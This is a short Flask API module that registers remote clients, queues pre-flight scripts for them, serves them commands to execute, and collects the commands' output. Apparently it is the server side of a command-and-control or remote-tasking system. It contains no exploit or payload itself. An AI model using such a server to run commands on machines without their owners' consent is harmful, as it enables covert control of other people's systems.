from flask import jsonify, request

from common.config import read_pre_flight
from common.models.client import Client
from common.models.command import Command
from common.models.output import Output
from web.api import api

ALL_GOOD = 200
CLIENT_NOT_FOUND = 402
BAD_COMMAND_ID = 403
NO_COMMANDS_FOR_YOU = 404
COMMAND_IS_SERVED = 200


@api.route('/register', methods=['POST'])
def register():
    """ The view where a new clients reaches
        when he desires to register """

    c = Client(
        user_agent=request.form.get('user_agent', '-')
    )
    c.save()

    for script in read_pre_flight():
        c.run_command(script)

    return jsonify({
        'status': ALL_GOOD,
        'id': c.cid
    })


@api.route('/poll', methods=['GET'])
def poll_new_commands():
    """ The view where a client reaches when
        he polls for new commands """

    client_id = request.args.get('id')
    client = Client.objects(cid=client_id).first()

    if not client:
        return jsonify({
            'status': CLIENT_NOT_FOUND
        })

    client.update_last_seen()
    command = client.get_first_not_served_command()

    if not command:
        return jsonify({
            'status': NO_COMMANDS_FOR_YOU
        })

    command.set_served()

    return jsonify({
        'status': COMMAND_IS_SERVED,
        'command': {
            'id': command.cid,
            'text': command.text
        }
    })


@api.route('/post_back', methods=['POST'])
def post_back():
    """ The view where a client reaches when
        he posts back the output of executed commands """

    command_id = request.form.get('id')
    output_text = request.form.get('output')

    cmd = Command.objects(cid=command_id).first()

    if not cmd:
        return jsonify({
            'status': BAD_COMMAND_ID
        })

    output = Output(text=output_text)
    output.save()

    cmd.set_output(output)

    return jsonify({
        'status': ALL_GOOD
    })
